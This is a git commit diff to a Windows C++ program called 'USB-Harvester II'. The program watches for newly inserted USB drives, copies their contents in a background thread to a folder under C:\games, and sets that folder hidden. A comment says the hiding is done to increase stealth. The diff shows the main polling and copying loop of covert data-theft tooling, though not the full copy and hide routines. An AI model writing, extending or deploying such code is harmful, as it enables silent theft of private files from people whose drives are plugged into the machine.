c1af3edc8945567afbb55346e9ade0957ef12066
luguanxing <651571925@qq.com>
2016-09-20 01:08:23 +0800

    USB-Harvester II

--- 02-U盘自动复制/U盘收割机V2.0/USB-HarvesterII.cpp
+++ 02-U盘自动复制/U盘收割机V2.0/USB-HarvesterII.cpp
@@ -5,14 +5,13 @@
 #include <stdlib.h>
 #include <vector>
 #include <algorithm>
-#include <set>
 using namespace std;
 
 int usbnums;
-char usbname[20];
 char src[20] = "X:\\";
-char dest[20] = "D:\\games\\files[X]\\";
-set<int> currentdisks;
+char dest[20] = "C:\\games\\files[X]\\";
+char usbname[20];
+vector<int> currentdisks;
 vector<int> newdisks;
 
 HANDLE hthread_hide = NULL;
@@ -31,21 +30,19 @@ int main() {
 
 	while (true) {
 		int status = diskstatus();
-		if (status == 1) {	//有新盘符
+		if (status == 1) {		//有新盘符
 			for (int i = 0; i < newdisks.size(); i++) {
-				sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
+				sprintf(dest, "C:\\games\\files[%d]\\", usbnums);
 				src[0] = newdisks[i];
 				CreateThread(NULL, 0, hide, NULL, 0, NULL);
 				copy();
-				WCHAR   wstr[MAX_PATH] = { 0 };		//为兼容VS2015不能转化char*为lpctstr而设置
-				MultiByteToWideChar(CP_ACP, 0, dest, -1, wstr, sizeof(wstr));
-				::SetFileAttributes(wstr, FILE_ATTRIBUTE_HIDDEN);	//设置存放目录为隐藏，增加隐蔽性
+				::SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN);	//设置存放目录为隐藏，增加隐蔽性
 				usbnums++;
 			}
 			newdisks.clear();
-		} else if (status == 0)	//无新盘符
-			Sleep(1000);
-		else ;	//盘符退出
+		}
+		else		//无新盘符
+			Sleep(500);
 	}
 	return 0;
 }
